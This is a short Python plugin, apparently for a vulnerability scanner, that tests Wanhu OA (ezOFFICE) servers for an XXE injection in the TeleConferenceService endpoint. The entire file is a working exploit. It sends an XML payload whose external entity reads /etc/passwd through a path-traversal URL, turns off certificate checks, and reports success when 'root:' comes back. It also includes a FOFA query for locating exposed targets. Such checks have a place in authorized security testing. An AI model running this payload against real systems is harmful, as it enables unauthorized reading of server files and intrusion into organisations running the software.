#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/万户OA/万户OA TeleConferenceService XXE注入漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '万户OA TeleConferenceService XXE注入',

      'level'     :   'high',

      'FOFA'      :   'app="万户网络-ezOFFICE"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService'
  data = '''
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>        
<value>&xxe;</value>
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret